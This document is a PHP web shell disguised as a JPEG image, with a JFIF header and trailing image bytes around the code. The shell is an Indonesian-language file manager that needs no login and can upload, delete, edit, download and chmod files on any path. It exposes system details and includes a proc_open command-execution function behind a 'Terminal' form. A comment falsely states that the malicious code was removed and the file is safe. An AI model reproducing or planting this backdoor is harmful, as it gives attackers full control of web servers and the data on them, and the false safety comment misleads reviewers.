    JFIF  
<?php

function executeCommand($input) {
    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w") 
    );

    $process = proc_open($input, $descriptors, $pipes);

    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $errorOutput = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        $exitCode = proc_close($process);

        if ($exitCode === 0) {
            return $output;
        } else {
            return "Error: " . $errorOutput;
        }
    } else {
        return "Tidak dapat menjalankan perintah\n";
    }
}


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


function delete_file($file) {
    if (file_exists($file)) {
        unlink($file);
        echo '<div class="alert alert-success">File berhasil dihapus: ' . $file . '</div>';
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

function create_folder($folder_name) {
    if (!file_exists($folder_name)) {
        mkdir($folder_name);
        echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_name . '</div>';
    } else {
        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_name . '</div>';
    }
}

function rename_file($file, $new_name) {
    $dir = dirname($file);
    $new_file = $dir . '/' . $new_name;
    if (file_exists($file)) {
        if (!file_exists($new_file)) {
            rename($file, $new_file);
            echo '<div class="alert alert-success">File berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">File dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

function rename_folder($folder, $new_name) {
    $dir = dirname($folder);
    $new_folder = $dir . '/' . $new_name;
    if (file_exists($folder)) {
        if (!file_exists($new_folder)) {
            rename($folder, $new_folder);
            echo '<div class="alert alert-success">Folder berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">Folder dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">Folder tidak ditemukan: ' . $folder . '</div>';
    }
}

function change_permissions($file, $permissions) {
    if (file_exists($file)) {
        if (chmod($file, octdec($permissions))) {
            echo '<div class="alert alert-success">Izin file berhasil diubah: ' . $file . '</div>';
        } else {
            echo '<div class="alert alert-danger">Gagal mengubah izin file: ' . $file . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function read_file_content($file) {
    if (file_exists($file)) {
        return file_get_contents($file);
    } else {
        return "File tidak ditemukan: " . $file;
    }
}

function save_file_content($file, $content) {
    if (file_exists($file)) {
        file_put_contents($file, $content);
        echo '<div class="alert alert-success">File berhasil disimpan: ' . $file . '</div>';
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

$dir = $_GET['path'] ?? __DIR__;

if (isset($_POST['submit'])) {
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    move_uploaded_file($file_tmp, $dir . '/' . $file_name);
}

if (isset($_POST['create_folder'])) {
    create_folder($dir . '/' . $_POST['folder_name']);
}

if (isset($_GET['delete'])) {
    delete_file($dir . '/' . $_GET['delete']);
}

if (isset($_POST['rename_file'])) {
    rename_file($dir . '/' . $_POST['file_name'], $_POST['new_name']);
}

if (isset($_POST['rename_folder'])) {
    rename_folder($dir . '/' . $_POST['folder_name'], $_POST['new_name']);
}

if (isset($_POST['change_permissions'])) {
    change_permissions($dir . '/' . $_POST['file_name'], $_POST['permissions']);
}

if (isset($_POST['save_file'])) {
    save_file_content($dir . '/' . $_POST['file_name'], $_POST['file_content']);
}

if (isset($_GET['download'])) {
    $file = $dir . '/' . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

function display_path_links($path) {
    $parts = explode('/', $path);
    $accumulated_path = '';
    foreach ($parts as $part) {
        if ($part) {
            $accumulated_path .= '/' . $part;
            echo '<a href="?path=' . urlencode($accumulated_path) . '">' . $part . '</a>/';
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8">
    <title>File Manager | Akmal archtte id</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #000428, #004e92);
            color: white;
            font-family: 'Courier New', Courier, monospace;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.85);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .list-group-item {
            background-color: transparent;
            border: none;
            padding: 10px 5px;
            word-wrap: break-word;
        }
        .list-group-item a {
            color: #ffffff;
            text-decoration: none;
        }
        .list-group-item a:hover {
            color: #00bfff;
        }
        .permissions {
            font-family: monospace;
                       color: #00ffdd;
            margin-right: 10px;
            display: inline-block;
            width: 100px;
        }
        .file-item, .folder-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .file-actions, .folder-actions {
            display: flex;
            gap: 10px;
        }
        .file-info, .folder-info {
            flex: 1;
            display: flex;
            align-items: center;
        }
        .file-info span, .folder-info span {
            margin-right: 10px;
        }
        .rename-form, .chmod-form {
            display: none;
        }
        .chmod-form {
            margin-top: 5px;
        }
        .text-link {
            cursor: pointer;
            color: #00ffdd;
        }
        .text-link:hover {
            color: #00bfff;
        }
        .non-editable {
            color: red;
        }
        .non-editable a {
            color: red;
        }
        footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }
    </style>
    <script>
        function confirmChmod(form) {
            if (confirm('Apakah Anda yakin ingin mengubah izin file ini?')) {
                form.submit();
            }
        }

        function toggleRenameForm(id) {
            var form = document.getElementById(id);
            form.style.display = form.style.display === 'none' ? 'block' : 'none';
        }
        
        function toggleChmodForm(id) {
            var form = document.getElementById(id);
            form.style.display = form.style.display === 'none' ? 'block' : 'none';
        }

        function toggleMusic() {
            var music = document.getElementById('background-music');
            var toggleButton = document.getElementById('music-toggle');
            if (music.paused) {
                music.play();
                toggleButton.textContent = 'Pause Music';
            } else {
                music.pause();
                toggleButton.textContent = 'Play Music';
            }
        }
    </script>
</head>
<body>
<div class="container">
    <h1 class="my-4">File Manager | Akmal archtte id</h1>
    <?php 
    echo 'Server: ' . $_SERVER['SERVER_SOFTWARE'] . '<br>';
    echo 'System: ' . php_uname() . '<br>';
    echo 'User: ' . get_current_user() . ' (' . getmyuid() . ')<br>';
    echo 'PHP Version: ' . phpversion() . '<br>';
    echo 'Directory: ';
    display_path_links($dir);
    echo '<br><br>';

    $folders = [];
    $files = [];

    if ($handle = opendir($dir)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != "..") {
                $full_path = $dir . '/' . $file;
                if (is_dir($full_path)) {
                    $folders[] = $file;
                } else {
                    $files[] = $file;
                }
            }
        }
        closedir($handle);

        natsort($folders);
        natsort($files);

        echo '<ul class="list-group">';

        foreach ($folders as $folder) {
            $full_path = $dir . '/' . $folder;
            $permissions = get_permissions($full_path);
            $class = is_readable($full_path) ? 'folder-item' : 'folder-item non-editable';
            if ($full_path === '/') {
                $class = 'folder-item non-editable';
            }
            echo '<li class="list-group-item ' . $class . '">
                <div class="folder-info">
                    <span class="permissions">' . $permissions . '</span>
                    <a href="?path=' . urlencode($full_path) . '">' . $folder . '</a>
                </div>
                <div class="folder-actions">
                    <span class="text-link" onclick="toggleRenameForm(\'rename-folder-' . htmlspecialchars($folder) . '\')">Rename</span>
                    <form method="post" class="rename-form" id="rename-folder-' . htmlspecialchars($folder) . '">
                        <input type="hidden" name="folder_name" value="' . htmlspecialchars($folder) . '">
                        <input type="text" name="new_name" class="form-control d-inline w-50" placeholder="New name">
                        <button type="submit" name="rename_folder" class="btn btn-warning btn-sm">Save</button>
                    </form>
                    <a href="?path=' . urlencode($dir) . '&delete=' . urlencode($folder) . '" class="text-link">Delete</a>
                </div>
            </li>';
        }

        foreach ($files as $file) {
            $full_path = $dir . '/' . $file;
            $permissions = get_permissions($full_path);
            $class = is_readable($full_path) ? 'file-item' : 'file-item non-editable';
            echo '<li class="list-group-item ' . $class . '">
                <div class="file-info">
                    <span class="permissions">' . $permissions . '</span>' . $file . '
                </div>
                <div class="file-actions">
                    <a href="?path=' . urlencode($dir) . '&download=' . urlencode($file) . '" class="text-link">Download</a>
                    <a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="text-link">Delete</a>
                    <span class="text-link" onclick="toggleChmodForm(\'chmod-file-' . htmlspecialchars($file) . '\')">Chmod</span>
                    <form method="post" class="chmod-form" id="chmod-file-' . htmlspecialchars($file) . '" onsubmit="event.preventDefault(); confirmChmod(this);">
                        <input type="hidden" name="file_name" value="' . htmlspecialchars($file) . '">
                        <input type="text" name="permissions" class="form-control d-inline w-50" placeholder="0755">
                        <button type="submit" name="change_permissions" class="btn btn-info btn-sm">Save</button>
                    </form>
                    <span class="text-link" onclick="toggleRenameForm(\'rename-file-' . htmlspecialchars($file) . '\')">Rename</span>
                    <form method="post" class="rename-form" id="rename-file-' . htmlspecialchars($file) . '">
                        <input type="hidden" name="file_name" value="' . htmlspecialchars($file) . '">
                        <input type="text" name="new_name" class="form-control d-inline w-50" placeholder="New name">
                        <button type="submit" name="rename_file" class="btn btn-warning btn-sm">Save</button>
                    </form>
                    <form method="get" class="d-inline">
                        <input type="hidden" name="edit" value="' . htmlspecialchars($file) . '">
                        <button type="submit" class="btn btn-secondary btn-sm">Edit</button>
                    </form>
                </div>
            </li>';
        }

        echo '</ul>';
    }

    if (isset($_GET['edit'])) {
        $file_to_edit = $dir . '/' . $_GET['edit'];
        $file_content = read_file_content($file_to_edit);
        echo '<div class="my-4">
            <h2>Edit File: ' . htmlspecialchars($_GET['edit']) . '</h2>
            <form method="post">
                <input type="hidden" name="file_name" value="' . htmlspecialchars($_GET['edit']) . '">
                <div class="form-group">
                    <textarea name="file_content" class="form-control" rows="10">' . htmlspecialchars($file_content) . '</textarea>
                </div>
                <button type="submit" name="save_file" class="btn btn-success">Save</button>
            </form>
        </div>';
    }
    ?>
    
    <form method="post" class="my-4">
        <div class="form-group">
            <input type="text" name="folder_name" class="form-control" placeholder="Folder name">
        </div>
        <button type="submit" name="create_folder" class="btn btn-success">Create Folder</button>
    </form>

    <form method="post" enctype="multipart/form-data" class="my-4">
        <div class="form-group">
            <input type="file" name="file" class="form-control-file">
        </div>
        <button type="submit" name="submit" class="btn btn-primary">Upload</button>
    </form>

    <pre style="color: cyan;">Terminal</pre>
    <form method="get" action="">
        <div class="form-group">
            <label for="command">Command:</label>
            <input type="text" name="c" id="command" class="form-control" placeholder="Enter your command">
        </div>
        <button type="submit" class="btn btn-primary">Execute</button>
    </form>
    
    <footer class="mt-4">
        <p>© 2024 Akmal archtte id</p>
        <button id="music-toggle" class="btn btn-secondary" onclick="toggleMusic()">Play Music</button>
        <audio id="background-music" loop>
            <source src="https://e.top4top.io/m_3101b5t1k0.mp3" type="audio/mpeg">
        </audio>
    </footer>
</div>
</body>
</html>













			



		


  C
	
      " #Qr    &1!A"2qQa   ? y, /3J ݹ ߲؋5 Xw   y R  I0 2 PI I  iM    r N&"KgX:    nTJnLK  @! -    m ; g   & hw   @ ܗ9 - . 1<y    Q U ہ?.    b߱ ֫ w*V  ) `$  b ԟ  X - T  G 3 g     Jx   U/  v_s(H @T J    n  ! gfb c : l[ Qe9 PLb  C m[5  ' j gl   _   l-;"Pk   Q _ ^ S x?"   Y騐 O 	q `~~ t U Cڒ V		I1  _  